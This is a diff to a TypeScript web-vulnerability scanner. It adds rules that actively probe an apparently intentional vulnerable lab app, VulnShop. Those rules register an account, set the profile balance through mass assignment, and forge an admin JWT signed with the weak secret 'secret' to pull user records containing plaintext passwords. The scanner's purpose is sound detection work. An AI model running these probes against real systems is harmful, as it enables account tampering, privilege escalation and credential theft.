@@ -29215,6 +29215,202 @@ const vulnshopOrdersIdorRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+async function vulnshopRegisterLogin(
+  ctx: RuleContext
+): Promise<{ token: string; apiBase: string; username: string } | null> {
+  const apiBase = vulnshopApiBase(ctx);
+  if (!apiBase) return null;
+  const username = `thugir${Date.now().toString(36)}`;
+  const password = "ThugirProbe123!";
+  const registerDoc = await ctx.probe.get(`${apiBase}/auth/register`, {
+    method: "POST",
+    body: JSON.stringify({ username, password, email: `${username}@thugir-probe.invalid` }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (registerDoc.status < 200 || registerDoc.status >= 400) return null;
+  const loginDoc = await ctx.probe.get(`${apiBase}/auth/login`, {
+    method: "POST",
+    body: JSON.stringify({ username, password }),
+    headers: { "Content-Type": "application/json" },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (loginDoc.status < 200 || loginDoc.status >= 300) return null;
+  let token = "";
+  try {
+    token = (JSON.parse(loginDoc.body) as { token?: string }).token ?? "";
+  } catch {
+    return null;
+  }
+  if (!token) return null;
+  return { token, apiBase, username };
+}
+
+function vulnshopForgedAdminJwt(): string {
+  const now = Math.floor(Date.now() / 1000);
+  return buildHs256Jwt(
+    { is_admin: true, username: "thugir", sub: "1", exp: now + 3600 },
+    "secret"
+  );
+}
+
+const vulnshopProfileMassAssignmentLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const session = await vulnshopRegisterLogin(ctx);
+  if (!session) return NEGATIVE;
+  const profileUrl = `${session.apiBase}/profile`;
+  const targetBalance = 99999.99;
+  const updateDoc = await ctx.probe.get(profileUrl, {
+    method: "PUT",
+    body: JSON.stringify({ balance: targetBalance }),
+    headers: {
+      "Content-Type": "application/json",
+      Authorization: `Bearer ${session.token}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (updateDoc.status < 200 || updateDoc.status >= 300) return NEGATIVE;
+  const verifyDoc = await ctx.probe.get(profileUrl, {
+    maxBytes: 4096,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${session.token}` }
+  });
+  if (verifyDoc.status < 200 || verifyDoc.status >= 300) return NEGATIVE;
+  const balanceMatch = verifyDoc.body.match(/"balance"\s*:\s*([0-9.]+)/);
+  const balance = balanceMatch ? Number(balanceMatch[1]) : 0;
+  if (balance < targetBalance - 1) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      profileUrl,
+      balance,
+      snippet: verifyDoc.body.slice(0, 200).trim(),
+      note: "VulnShop PUT /api/profile accepts client-supplied balance without restriction — mass-assignment oracle"
+    }
+  };
+};
+
+const vulnshopProfileMassAssignmentRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/profile\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await vulnshopProfileMassAssignmentLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /profile route scan — live mass-assignment via balance field confirmed"
+      }
+    };
+  }
+  const module = vulnshopModuleEvidence(ctx, /\/profile\b/i);
+  if (!module) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: module.confidence,
+    evidence: {
+      ...module.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnShop /profile route scan — mass-assignment via client-supplied balance field documented in SPA"
+    }
+  };
+};
+
+const vulnshopAdminPanelLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const apiBase = vulnshopApiBase(ctx);
+  if (!apiBase) return NEGATIVE;
+  const forged = vulnshopForgedAdminJwt();
+  const usersUrl = `${apiBase}/admin/users`;
+  const doc = await ctx.probe.get(usersUrl, {
+    maxBytes: 8192,
+    timeoutMs: 15000,
+    headers: { Authorization: `Bearer ${forged}` }
+  });
+  if (doc.status < 200 || doc.status >= 300) return NEGATIVE;
+  if (
+    !/"password"\s*:/i.test(doc.body) ||
+    !/"is_admin"\s*:/i.test(doc.body) ||
+    !/"balance"\s*:/i.test(doc.body)
+  ) {
+    return NEGATIVE;
+  }
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      usersUrl,
+      snippet: doc.body.slice(0, 240).trim(),
+      note: "VulnShop forged is_admin JWT grants GET /api/admin/users with plaintext passwords and balances — admin panel broken access control oracle"
+    }
+  };
+};
+
+const vulnshopAdminPanelRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/admin\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await vulnshopAdminPanelLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /admin route scan — forged JWT admin panel user enumeration with plaintext passwords confirmed"
+      }
+    };
+  }
+  const module = vulnshopModuleEvidence(ctx, /\/admin\b/i);
+  if (!module) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: module.confidence,
+    evidence: {
+      ...module.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnShop /admin route scan — JWT is_admin bypass and zero-auth debug routes documented in SPA"
+    }
+  };
+};
+
+const vulnshopUsersEnumerationRouteLiveOracle: Rule = async (ctx) => {
+  if (!isVulnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/users\b/i.test(pageUrl)) return NEGATIVE;
+  const live = await vulnshopAdminPanelLiveOracle(ctx);
+  if (live.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "VulnShop /users route scan — admin user enumeration with plaintext passwords confirmed via forged JWT"
+      }
+    };
+  }
+  const module = vulnshopModuleEvidence(ctx, /\/users\b/i);
+  if (!module) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: module.confidence,
+    evidence: {
+      ...module.evidence,
+      scannedUrl: pageUrl,
+      note: "VulnShop /users route scan — unauthenticated user enumeration with plaintext passwords via admin and debug routes documented in SPA"
+    }
+  };
+};
+
 const clientSideVulnshopModuleEvidence: Rule = async (ctx) => {
   const pageUrl = ctx.home.finalUrl || ctx.scanUrl || ctx.origin;
   const urlCorpus = [pageUrl, ctx.scanUrl].filter(Boolean).join("\n");
@@ -47648,6 +47844,11 @@ export const RULES: Record<string, Rule> = {
   vulnshopProductsSqliRouteLiveOracle,
   vulnshopOrdersIdorLiveOracle,
   vulnshopOrdersIdorRouteLiveOracle,
+  vulnshopProfileMassAssignmentLiveOracle,
+  vulnshopProfileMassAssignmentRouteLiveOracle,
+  vulnshopAdminPanelLiveOracle,
+  vulnshopAdminPanelRouteLiveOracle,
+  vulnshopUsersEnumerationRouteLiveOracle,
   clientSideBuggybuyEvidence,
   clientSideWebSecurityLearningLabsEvidence,
   clientSideJwtlensEvidence,
